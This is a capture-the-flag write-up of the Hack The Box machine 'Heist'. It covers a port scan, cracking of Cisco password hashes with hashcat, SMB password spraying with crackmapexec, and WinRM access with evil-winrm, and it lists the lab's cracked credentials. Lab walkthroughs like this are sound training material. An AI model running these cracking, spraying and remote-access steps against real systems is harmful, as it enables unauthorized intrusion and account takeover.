---
description: https://app.hackthebox.com/machines/201
cover: ../../../.gitbook/assets/Heist.png
coverY: -71.63212435233162
---

# Heist

## Nmap

```
sudo nmap 10.10.10.149 -p- -sS -sV                               

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Starting out we dive straight into port 80 where we are present with a login page. Testing with some common usernames and credentials proves unsuccessful.

![](<../../../.gitbook/assets/image (789).png>)

### Interesting attachment

We then use the "Login as guest" option and are directed to the `/issues.php` page. On this we see the user _Hazard_ has attached a router configuration file.

![](<../../../.gitbook/assets/image (699).png>)

The contents of the Cisco router configuration has been inserted below.

```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```

### Cisco Password Cracker

A little bit of research shows the Cisco "7" passwords can be easily decrypted to reveal the corresponding plain text string.

The following URL can be used to decrypt Cisco 7 passwords. Where we input both strings to get the passwords shown below.

![](<../../../.gitbook/assets/image (678).png>)

![](<../../../.gitbook/assets/image (843).png>)

**Passwords:**

* $superP@ssword
* Q4)sJu\Y8qz\*A3?d

### hashcat

This encrypted secret string within the file was then cracked using hashcat.

```
hashcat -a 0 -m 500 hash.hash /usr/share/wordlists/rockyou.txt
```

![](<../../../.gitbook/assets/image (779).png>)

### Password Spraying #1

Storing all the cracked passwords within a file alongside discovered potential usernames we then password spray with `crackmapexec` against SMB on the target system.

```
crackmapexec smb '10.10.10.149' -u ~/Desktop/usernames -p ~/Desktop/passwords -d 'heist.htb' --shares
```

![](<../../../.gitbook/assets/image (682).png>)

Where the following user credentials are revealed:

`hazard:stealth1agent`

Using the new set of credentials we can perform further recon against the target host to discover even more users.

```
enum4linux -u 'hazard' -p 'stealth1agent' -r '10.10.10.149' -w 'heist.htb'| grep 'Local User'
```

![](<../../../.gitbook/assets/image (97).png>)

### Password Spraying #2

With a more complete list of usernames we then spray again against `SMB.`

```
crackmapexec smb '10.10.10.149' -u ~/Desktop/usernames -p ~/Desktop/passwords -d 'heist.htb' --continue-on-success
```

![](<../../../.gitbook/assets/image (728).png>)

Where the following user credentials are revealed:

`chase:Q4)sJu\Y8qz*A3?d`

### WinRM

Using the newly acquires credentials we test `WinRm` with `Evil-WinRm` and obtain a foothold.

```
evil-winrm -i '10.10.10.149' -u 'chase' -p 'Q4)sJu\Y8qz*A3?d'
```

![](<../../../.gitbook/assets/image (816).png>)

### User Flag

Grabbing the user.txt flag.

![](<../../../.gitbook/assets/image (783).png>)

### Mozilla Maintenance Logs

Performing application enumeration on the target system we find Mozilla Firefox is installed.

![](<../../../.gitbook/assets/image (618).png>)

Searching through the log files it is revealed the administrator has used credentials inline with the Firefox process which has been logged by the Mozilla Maintenance service.

![](<../../../.gitbook/assets/image (746).png>)

Credentials: `Administrator:4dD!5}x/re8]FBuZ`

### Root Flag

The credentials are then used against the system over `WinRm` and confirmed administrative access.

```
evil-winrm -i '10.10.10.149' -u 'administrator' -p '4dD!5}x/re8]FBuZ'
```

![](<../../../.gitbook/assets/image (922).png>)
